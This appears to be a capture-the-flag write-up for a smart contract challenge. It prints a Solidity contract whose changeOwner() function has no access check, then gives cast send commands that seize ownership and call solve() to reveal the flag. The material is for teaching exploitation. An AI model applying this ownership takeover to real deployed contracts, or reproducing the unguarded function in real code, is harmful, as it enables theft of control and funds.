# URL
https://learn.cylabacademy.org/library/723
# Concept
* interacting with Ethereum nodes using CLI tools
* using the Cast tool
# Method of solve
* in this challenge, we're introduced to the concept of smart contract hacking
* this involves exploiting insecure code used in the smart contract
* this challenge's smart contract uses the following code:
```Solidity
pragma solidity ^0.8.0;

contract AccessControl {
    address public owner;
    string private flag;
    
    bool public revealed;

    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event FlagRevealed(string flag);

    constructor(string memory _flag) {
        owner = msg.sender;
        flag = _flag;
        revealed = false;
    }

    function changeOwner(address _newOwner) public {
        address oldOwner = owner;
        owner = _newOwner;
        emit OwnerChanged(oldOwner, _newOwner);
    }

    function solve() public {
        require(msg.sender == owner, "Only the owner can get the flag.");
        
        if (!revealed) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function getFlag() public view returns (string memory) {
        require(revealed, "Challenge not yet solved!");
        return flag;
    }
}    
```
* there is a flaw in the security of this contract's `changeOwner()` function
```Solidity
function changeOwner(address _newOwner) public {
        address oldOwner = owner;
        owner = _newOwner;
        emit OwnerChanged(oldOwner, _newOwner);
    }
```
* this function doesn't have an access control check to determine whether the new owner has authorization to run this function
* so to solve this challenge we can use the `cast` tool:
```
https://github.com/matter-labs/foundry-zksync
```
* when we use the `cast` tool, we need a number of different parameters
  * the RPC-URL which is the ETH node, e.g., `http://lonely-island.picoctf.net:59183`
  * the smart contract address
  * our wallet's private key
  * our wallet's address
* so the first thing we need to do for this challenge is to change the contract's owner:
```
cast send <CONTRACT_ADDRESS> 'changeOwner(address)' <OUR_WALLET_ADDRESS> --private-key <OUR_PRIVATE_KEY> --gas-limit 200000 --rpc-url <RPC-URL>
```
* after that command, we own the contract, so we can run the `solve()` function
```
cast send <CONTRACT_ADDRESS> 'solve()' --private-key <OUR_PRIVATE_KEY> --gas-limit 200000 --rpc-url <RPC-URL>
```
